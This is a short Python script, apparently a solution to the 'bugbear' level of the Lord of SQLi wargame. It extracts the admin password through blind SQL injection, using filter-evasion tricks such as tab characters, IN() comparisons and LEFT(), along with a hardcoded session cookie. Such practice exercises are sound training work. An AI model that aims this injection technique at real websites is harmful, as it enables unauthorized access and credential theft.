# LordofSQLi: bugbear
# woanmeo11

import requests
from string import digits, ascii_lowercase

url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
cookies = {'PHPSESSID': '7n1n89uq147dkn1dkvm753st6e'}
passwd = ''

while True:
    finish = True
    for c in digits + ascii_lowercase:
        payload = {'no': f'-1||id\tIN("admin")&&LEFT(pw,{len(passwd) + 1})IN("{passwd + c}")#'}
        r = requests.get(url, params=payload, cookies=cookies)
        print(c, end='', flush=True)
        if 'Hello admin' in r.text:
            passwd += c
            finish = False
            print('\n->' + passwd)
            break
    if finish:
        break

print('\n->' + passwd)
